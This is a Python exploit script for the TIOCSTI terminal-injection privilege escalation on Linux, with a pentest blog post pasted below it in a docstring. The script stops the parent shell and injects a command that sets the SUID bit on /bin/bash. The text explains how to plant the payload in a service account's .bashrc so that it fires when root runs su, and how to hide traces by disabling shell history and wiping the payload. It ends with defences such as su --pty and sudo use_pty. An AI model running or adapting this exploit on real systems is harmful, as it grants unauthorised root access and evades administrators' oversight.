#!/usr/bin/python3

##
## https://www.errno.fr/TTYPushback.html
## /tmp/xxxx

import os
import sys
import signal
import fcntl
import termios

os.kill(os.getppid(), signal.SIGSTOP)

for char in """bash -c 'chmod +s /bin/bash'\n""":
    fcntl.ioctl(0, termios.TIOCSTI, char)

############
##
##


"""

Why it works
Make it work
Always sneaking stabbing
Protecting against it
This trick is possibly the oldest security bug that still exists today, it’s been traced as far back as 1985.

It’s been discovered and rediscovered and re-rediscovered by sysadmins, developpers and pentesters every few years for close to 4 decades now. It’s been subject to multiple developper battles, countless posts, but still remains largely forgotten.

This is just another attempt at shedding light on it, for both attackers and defenders.

Why it works
The TIOCSTI ioctl can insert bytes in the tty’s input queue. It is used to simulate terminal input.

When running su lowpriv_user, by default no new pty is allocated: PTY stays the same

Therefore since we’re still in the same pty, input can be sent directly to the parent shell to execute commands in its context.

Make it work
Consider this python sample and assume it’s automatically being run at logon from the .bashrc of a technical account, such as postgres, to which the root user changes by typing su - postgres:

#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in sys.argv[1] + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
We’re sending SIGSTOP to the lowpriv shell to get the focus back to its parent, the root shell. Then sending the characters one by one using the TIOCSTI ioctl injects them into the root shell as if they were input manually, until ‘\n’ is sent which executes the command.

get root or go home

And that’s it, you’re now root. Devilishly simple.

Always sneaking stabbing
Running the following command will attempt to wipe most of your traces and get back to the lowpriv shell: cmd = ' set +o history\n' + sys.argv[1] + '\nfg\nreset\n'

You should also wipe your payload from the .bashrc file.

Hopefully this doesn’t alert the sysadmin.

Protecting against it
From su’s manpage:

   -P, --pty
   Create a pseudo-terminal for the session. The independent terminal provides better security as the user does not share a terminal with the original session. This can be used to avoid TIOCSTI ioctl
   terminal injection and other security attacks against terminal file descriptors. The entire session can also be moved to the background (e.g., su --pty - username -c application &). If the
   pseudo-terminal is enabled, then su works as a proxy between the sessions (sync stdin and stdout).

   This feature is mostly designed for interactive sessions. If the standard input is not a terminal, but for example a pipe (e.g., echo "date" | su --pty), then the ECHO flag for the pseudo-terminal
   is disabled to avoid messy output.
Here’s the protection in action (fg has been manually inputed to return to lowpriv’s shell, notice how the command was “buffered” until we came back to it): PTY has changed

Note that RHEL7 does not have the option, whereas RHEL8 does.

Note that the su command is not the only one affected by the bug, it’s a broader problem due to the ioctl itself. From the sudoers(3) manpage:

    use_pty
    If set, and sudo is running in a terminal, the command will be run in a pseudo-terminal (even if no I/O logging is being done).  If the sudo process is not attached to a terminal,
    use_pty has no effect.

    A malicious program run under sudo may be capable of injecting commands into the user's terminal or running a background process that retains access to the user's terminal device even
    after the main program has finished executing.  By running the command in a separate pseudo-terminal, this attack is no longer possible.  This flag is off by default.
The ioctl also has been restricted since 2016 in grsecurity, under the name GRKERNSEC_HARDEN_TTY.

The Linux kernel 6.2 also has introduced an optional mechanism to protect against it.

Things are moving, albeit slowly, and are not defaults yet. This privesc will still be valid for the foreseeable future, don’t forget it this time!

"""
